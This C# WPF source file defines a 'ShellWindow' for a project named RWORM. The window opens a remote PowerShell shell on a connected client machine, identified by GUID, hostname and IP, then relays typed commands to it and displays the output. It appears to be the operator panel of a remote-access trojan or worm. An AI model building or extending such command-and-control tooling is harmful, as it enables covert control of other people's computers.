using System;
using System.Windows;
using System.Windows.Input;
using System.Windows.Media;
using RWORM.GUI.Services;

namespace RWORM.GUI.Views
{
    public partial class ShellWindow : Window
    {
        private readonly ServerConnection _server;
        private readonly string           _clientGuid;

        public ShellWindow(ServerConnection server, string clientGuid,
                           string hostname, string ipAddress)
        {
            InitializeComponent();

            _server     = server;
            _clientGuid = clientGuid;

            Title = $"Shell — {hostname}";
            TitleLabel.Text = $"{hostname}  ·  {ipAddress}";

            
            _server.RegisterShellHandler(clientGuid, OnShellOutput);

            
            _ = _server.OpenShellAsync(clientGuid);

            
            OutputBox.TextChanged += (s, e) => OutputBox.ScrollToEnd();

            InputBox.Focus();

            Append($"[*] Connecting shell to {hostname} ({ipAddress})...\r\n");
        }

        
        private void OnShellOutput(string output)
        {
            Dispatcher.Invoke(() => Append(output));
        }

        private void Append(string text)
        {
            OutputBox.AppendText(text);
            OutputBox.ScrollToEnd();
        }

        
        private void InputBox_KeyDown(object sender, KeyEventArgs e)
        {
            if (e.Key == Key.Enter)
            {
                var cmd = InputBox.Text.Trim();
                InputBox.Clear();

                if (string.IsNullOrEmpty(cmd)) return;

                
                Append($"PS❯ {cmd}\r\n");

                _ = _server.SendShellInputAsync(_clientGuid, cmd);
                e.Handled = true;
            }
            else if (e.Key == Key.Up)
            {
                
                e.Handled = true;
            }
        }

        
        protected override void OnClosed(EventArgs e)
        {
            _server.UnregisterShellHandler(_clientGuid);
            _ = _server.CloseShellAsync(_clientGuid);
            base.OnClosed(e);
        }
    }
}
